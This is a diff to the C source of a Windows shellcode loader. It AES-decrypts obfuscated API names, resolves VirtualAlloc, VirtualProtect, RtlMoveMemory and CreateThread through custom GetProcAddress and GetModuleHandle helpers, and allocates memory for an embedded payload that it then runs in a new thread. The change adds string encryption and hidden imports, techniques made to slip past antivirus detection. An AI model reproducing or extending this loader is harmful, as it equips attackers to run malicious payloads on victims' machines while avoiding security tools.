@@ -17,6 +17,8 @@ https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
 https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
 https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 
+https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-multibytetowidechar
+
 
 @ECHO OFF
 
@@ -75,11 +77,13 @@ DONE:
 7) create thread
 8) waitforsingleobject
 9) virtual functions via typedefs
-
-TODO:
+10) encrypt function name strings
 getprocaddress helper (resolver)
 getmodulehandle helper (resolver)
-encrypt function name strings
+
+TODO:
+
+
 
 */
 
@@ -90,6 +94,9 @@ encrypt function name strings
 #include <wincrypt.h>
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
+#include <psapi.h>
+#include "helpers.h"
+
 
 typedef DWORD  (WINAPI * WaitForSingleObject_t)(HANDLE hHandle,DWORD  dwMilliseconds);
 typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
@@ -127,6 +134,7 @@ unsigned char kernel32[] = { 0xdf, 0x62, 0xc5, 0x47, 0xe9, 0xd3, 0xfe, 0x4c, 0xd
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
 
+
 	DWORD lpflOldProtect = 0;
 
 	AESDecrypt((char *)kernel32, sizeof(kernel32), (char *)key, sizeof(key));
@@ -152,20 +160,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	AESDecrypt((char *)RtlMoveMemoryEnc, sizeof(RtlMoveMemoryEnc), (char *)key, sizeof(key));
 	RtlMoveMemoryEnc[12] = '\0';
 	
+	LPWSTR kernUnicode[32];
 
-	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((char *)kernel32), (char *)VirtualAllocEnc);	
-	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((char *)kernel32), "RtlMoveMemory");
-	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(GetModuleHandle((char *)kernel32), (char *)WaitForSingleObjectEnc);
-	VirtualProtect_t pVirtualProtect = (VirtualProtect_t) GetProcAddress(GetModuleHandle((char *)kernel32), (char *)VirtualProtectEnc);
-	CreateThread_t pCreateThread = (CreateThread_t) GetProcAddress(GetModuleHandle((char *)kernel32), (char *)CreateThreadEnc);
+	
+	MultiByteToWideChar(CP_OEMCP, 0, (LPCCH) kernel32, sizeof(kernel32), (LPWSTR)kernUnicode, 32);
 
 
-
-	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
-	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
-
-
-
+	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)VirtualAllocEnc);
+	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), "RtlMoveMemory");
+	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)WaitForSingleObjectEnc);
+	VirtualProtect_t pVirtualProtect = (VirtualProtect_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)VirtualProtectEnc);
+	CreateThread_t pCreateThread = (CreateThread_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)CreateThreadEnc);
 
 
 	LPVOID memAlloc = pVirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
